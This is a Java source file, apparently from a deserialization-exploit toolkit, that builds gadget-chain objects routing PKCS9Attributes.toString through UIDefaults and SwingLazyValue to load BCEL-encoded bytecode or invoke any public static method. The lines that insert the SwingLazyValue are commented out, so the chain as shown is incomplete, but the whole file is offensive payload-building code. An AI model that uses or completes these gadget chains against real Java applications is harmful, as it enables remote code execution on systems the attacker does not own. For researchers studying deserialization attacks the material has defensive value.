package dev.silente.javashark.gadget.jdk;

import dev.silente.javashark.sink.jdk.SBCEL;
import dev.silente.javashark.utils.ReflectUtils;
import dev.silente.javashark.utils.TestUtils;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
//import sun.swing.SwingLazyValue;

import javax.swing.*;

public class GSwingLazyValue {

    // 使用这个方法需要更改 Class 的 _main 函数
    public static Object toString2BCELCode(Class<?> clz) throws Exception {
        /**
         * PKCS9Attributes.toString -> UIDefaults(Hashtable).get -> SwingLazyValue.createValue -> [sink] BCEL Code
         */
        PKCS9Attributes s = ReflectUtils.createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        String payload = SBCEL.getBCELCode(clz);
//        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));
        ReflectUtils.setFieldValue(s, "attributes", uiDefaults);
        return s;
    }

    // 任意 public static 方法执行
    public static Object toString2StaticInvoke(String className, String methodName, Object[] params) throws Exception {
        /**
         * PKCS9Attributes.toString -> UIDefaults(Hashtable).get -> SwingLazyValue.createValue -> public static method
         */
        PKCS9Attributes s = ReflectUtils.createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
//        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue(className, methodName, params));
        ReflectUtils.setFieldValue(s, "attributes", uiDefaults);
        return s;
    }
}
